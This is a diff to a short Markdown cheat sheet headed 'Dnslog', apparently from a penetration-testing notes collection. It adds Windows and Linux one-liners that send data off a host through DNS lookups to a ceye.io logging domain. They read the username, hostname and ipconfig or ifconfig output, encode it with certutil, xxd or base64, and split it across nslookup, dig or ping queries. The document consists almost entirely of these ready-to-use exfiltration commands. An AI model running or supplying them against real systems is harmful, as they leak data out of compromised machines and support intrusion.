@@ -1,8 +1,21 @@
 # Dnslog
 
+## Windows
+```bash
+ping %USERNAME%.xxxxx.ceye.io
+
+cmd /v /c "hostname > temp && certutil -encode temp temp2 && findstr /L /V "CERTIFICATE" temp2 > temp3 && set /p MYVAR=<temp3 && set FINAL=!MYVAR!.xxxxx.ceye.io && nslookup !FINAL!"
+
+ipconfig > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.xxxxx.ceye.io';$j += 1; nslookup $fin }
+```
+
 ## Linux
 ```bash
 ping `whoami`.xxxxx.ceye.io
+
+var=11111 && for b in $(ifconfig|xxd -p ); do var=$((var+1)) && dig $var.$b.xxxxx.ceye.io; done
+
+var=11111 && for i in $(ifconfig|base64|awk '{gsub(/.{50}/,"&\n")}1'); do var=$((var+1)) && nslookup $var.$i.xxxxx.ceye.io; done
 ```
 
 ## mssql
